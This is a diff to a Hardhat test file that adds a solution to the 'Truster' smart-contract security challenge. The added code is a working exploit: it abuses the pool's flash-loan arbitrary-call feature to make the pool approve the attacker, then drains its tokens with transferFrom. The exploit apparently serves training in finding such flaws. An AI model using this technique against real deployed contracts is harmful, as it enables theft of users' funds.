@@ -1,5 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { BigNumber } = require('ethers');
+const { AbiCoder } = require('ethers/lib/utils');
 
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
@@ -29,6 +31,15 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        // Invoke approve method for attacker to spend erc20 tokens on behalf of the pool
+        const abi = ["function approve(address spender, uint256 amount)"]
+        const interface = new ethers.utils.Interface(abi)
+        const amount = ethers.utils.parseEther("1000000")
+        const data = interface.encodeFunctionData("approve", [attacker.address, amount])
+
+        // Execute flashloan and subsequently drain the pool contract
+        this.pool.flashLoan(0, attacker.address, this.token.address, data);
+        this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, amount)
     });
 
     after(async function () {
